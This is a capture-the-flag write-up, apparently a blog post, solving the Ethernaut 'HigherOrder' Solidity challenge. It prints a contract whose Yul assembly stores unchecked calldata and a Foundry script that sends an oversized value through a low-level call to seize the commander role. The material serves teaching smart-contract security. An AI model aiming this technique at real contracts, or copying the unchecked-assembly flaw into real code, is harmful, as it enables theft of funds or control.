---
layout: post
title: "[Ethernaut] 30.HigherOrder
tags: blockchain ethernaut foundry Yul assembly bof
---

# Analysis

---

The goal is “to become the Commander of the Higher Order”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

The `registerTreasury()` function stores the parameter(received as `uint8` ) into the `treasury` slot.

The `claimLeadership()` function sets `msg.sender` as the `commander` if the `treasury` is greater than 255. 

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/HigherOrder.sol";
import "forge-std/Script.sol";

contract HigherOrderSol is Script {
    HigherOrder public ho_ = HigherOrder(0xCF87FA7f2DF958fe4c0e75C535A676543d4e19E0);

    function run() external {
        vm.startBroadcast();

        address(ho_).call(abi.encodeWithSignature("registerTreasury(uint8)", 0x100));
        console.log("treasury:  ", ho_.treasury());
        ho_.claimLeadership();
        console.log("commander: ", ho_.commander());

        vm.stopBroadcast();
    }
}
```

Since `registerTreasury()` utilizes Yul assembly, it ignores Solidity’s type safety. This allows storing a value larger than `uint8` into the `treasury` slot. 

By using a low-level `call` to bypass compiler checks, we successfully set the `treasury` value to exceed 255.